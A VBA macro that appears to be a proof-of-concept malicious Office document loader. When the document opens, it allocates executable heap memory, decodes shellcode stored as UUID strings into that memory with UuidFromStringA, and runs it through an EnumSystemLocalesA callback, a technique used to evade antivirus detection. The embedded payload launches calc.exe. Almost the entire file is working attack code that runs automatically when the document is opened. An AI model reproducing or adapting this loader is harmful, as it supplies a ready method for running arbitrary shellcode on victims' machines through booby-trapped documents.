Private Declare PtrSafe Function createMemory Lib "KERNEL32" Alias "HeapCreate" (ByVal flOptions As LongPtr, ByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr
Private Declare PtrSafe Function allocateMemory Lib "KERNEL32" Alias "HeapAlloc" (ByVal hHeap As LongPtr, ByVal dwFlags As LongPtr, ByVal dwBytes As LongPtr) As LongPtr
Private Declare PtrSafe Function UuidFromStringA Lib "RPCRT4" (ByVal StringUuid as String, ByVal Uuid as LongPtr) As LongPtr
Private Declare PtrSafe Function EnumSystemLocalesA Lib "KERNEL32" (ByVal lpLocaleEnumProc as LongPtr, ByVal dwFlags as LongPtr) As LongPtr

Sub Document_Open()

Dim shellCode As String
Dim shellLength As Long
Dim byteArray() As Byte
Dim memoryAddress As LongPtr

Dim oL As LongPtr
oL = 1
Dim rL As LongPtr

rL = createMemory(&H40000, 0, 0)
ImageNewAddr = allocateMemory(rL, 0, &H5000)
ImageAddr = ImageNewAddr

Dim ImageData(18)
ImageData(1) = "e48348fc-e8f0-00c0-0000-415141505251"
ImageData(2) = "d2314856-4865-528b-6048-8b5218488b52"
ImageData(3) = "728b4820-4850-b70f-4a4a-4d31c94831c0"
ImageData(4) = "7c613cac-2c02-4120-c1c9-0d4101c1e2ed"
ImageData(5) = "48514152-528b-8b20-423c-4801d08b8088"
ImageData(6) = "48000000-c085-6774-4801-d0508b481844"
ImageData(7) = "4920408b-d001-56e3-48ff-c9418b348848"
ImageData(8) = "314dd601-48c9-c031-ac41-c1c90d4101c1"
ImageData(9) = "f175e038-034c-244c-0845-39d175d85844"
ImageData(10) = "4924408b-d001-4166-8b0c-48448b401c49"
ImageData(11) = "8b41d001-8804-0148-d041-5841585e595a"
ImageData(12) = "59415841-5a41-8348-ec20-4152ffe05841"
ImageData(13) = "8b485a59-e912-ff57-ffff-5d48ba010000"
ImageData(14) = "00000000-4800-8d8d-0101-000041ba318b"
ImageData(15) = "d5ff876f-f0bb-a2b5-5641-baa695bd9dff"
ImageData(16) = "c48348d5-3c28-7c06-0a80-fbe07505bb47"
ImageData(17) = "6a6f7213-5900-8941-daff-d563616c632e"
ImageData(18) = "00657865-0000-0000-0000-000000000000"

For idx = 1 To Ubound(ImageData)
ret = UuidFromStringA(ImageData(idx), ImageNewAddr)
ImageNewAddr = ImageNewAddr + 16
Next idx

executeResult = EnumSystemLocalesA(ImageAddr, 0)

End Sub
